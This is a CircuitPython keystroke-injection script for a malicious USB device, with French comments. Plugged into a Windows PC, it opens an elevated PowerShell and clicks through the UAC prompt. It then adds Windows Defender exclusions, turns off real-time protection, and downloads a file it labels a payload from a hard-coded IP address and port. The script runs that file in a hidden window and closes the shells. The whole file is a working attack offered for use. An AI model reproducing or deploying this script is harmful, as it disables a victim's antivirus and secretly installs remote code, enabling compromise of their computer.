import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode_win_fr import Keycode
from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout

kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)
time.sleep(2)

def win_run(command, delay=0.5):
    kbd.press(Keycode.GUI, Keycode.R)
    kbd.release_all()
    time.sleep(delay)
    layout.write(command)
    kbd.press(Keycode.ENTER)
    kbd.release_all()

# Ouvrir CMD
win_run("cmd", delay=0.6)
time.sleep(1.5)

# Lancer PowerShell en admin
layout.write('powershell -Command "Start-Process powershell -Verb RunAs"')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# Valider UAC
kbd.press(Keycode.LEFT_ARROW)
kbd.release_all()
time.sleep(0.3)
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# Créer le dossier
layout.write("cd c:\\")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

layout.write("mkdir games")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

layout.write("cd games")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

# Ajouter les exclusions Defender 
layout.write('Add-MpPreference -ExclusionPath "C:\\games"')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

layout.write('Add-MpPreference -ExclusionProcess "dota.exe"')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

layout.write('Set-MpPreference -DisableRealtimeMonitoring $true')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# Télécharger le payload
layout.write("wget http://51.38.235.182:1234/dota.exe -O dota.exe")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)  # Augmenté pour le téléchargement

# Lancer le payload
layout.write('Start-Process "C:\\games\\dota.exe" -WindowStyle Hidden')
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(1)

# Fermer tout
layout.write("exit")
kbd.press(Keycode.ENTER)
kbd.release_all()
time.sleep(0.5)

layout.write("exit")
kbd.press(Keycode.ENTER)
kbd.release_all()
